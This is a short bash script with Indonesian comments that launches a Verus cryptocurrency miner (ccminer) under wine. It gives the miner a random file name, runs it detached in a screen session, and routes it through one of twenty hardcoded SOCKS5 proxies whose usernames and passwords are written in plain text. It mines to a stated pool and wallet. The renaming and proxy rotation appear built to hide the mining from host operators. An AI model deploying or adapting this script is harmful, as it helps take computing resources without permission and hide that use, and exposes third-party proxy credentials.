
chmod +x *
cd ccminer_CPU_3.8.3
proxy=("38.244.65.134:62000:9d7a5345:1d903d82" "38.244.65.163:62000:869e9722:2bb3a30f" "38.244.65.162:62000:a317e9b8:4a2467c2" "38.244.65.158:62000:ccef0295:2c98cdcb" "38.244.65.157:62000:970df1f4:c8f71afc" "38.244.65.155:62000:54cae45f:1ce7d5e3" "38.244.65.142:62000:71aab35a:764124a3" "38.244.65.141:62000:8e968c28:2c12e5e2" "38.244.65.140:62000:9bb78f50:8bbfcb4c" "38.244.65.135:62000:c959bbe2:7e04e99f" "38.244.65.105:62000:c4185399:4d1c84f5" "38.244.65.132:62000:28dfd5da:f8490809" "38.244.65.128:62000:389fab59:5e7404c1" "38.244.65.12:62000:3dd83e9b:61cf9c8a" "38.244.65.115:62000:7b8bf8b7:223785ca" "38.244.65.112:62000:ab9c72f9:da8704b9" "38.244.65.111:62000:49782572:86b8b18a" "38.244.65.11:62000:f5fff231:76d2c6d6" "38.244.65.108:62000:62c9d1d6:8f244be2" "38.244.65.107:62000:71e3bf26:d4a357d4")
selected_proxy=${proxy[$RANDOM % ${#proxy[@]}]}
ip_port=$(echo $selected_proxy | cut -d':' -f1-2)  # Menangkap ip:port
username_password=$(echo $selected_proxy | cut -d':' -f3-4)  # Menangkap username:password
proxy_url="socks5://$username_password@$ip_port"
random_name=$(tr -dc A-Za-z </dev/urandom | head -c 10)  # Menghasilkan nama acak sepanjang 8 karakter
mv ccminer.exe $random_name.exe
screen -d -m bash -c "wine $random_name.exe -a verus -o stratum+tcp://cn.vipor.net:5040 -u RV66gw7B2BsfrFeUZ65wVgxzDxRvuSqJnw.beluttgacor -p d=5 -t 4 --proxy=$proxy_url"
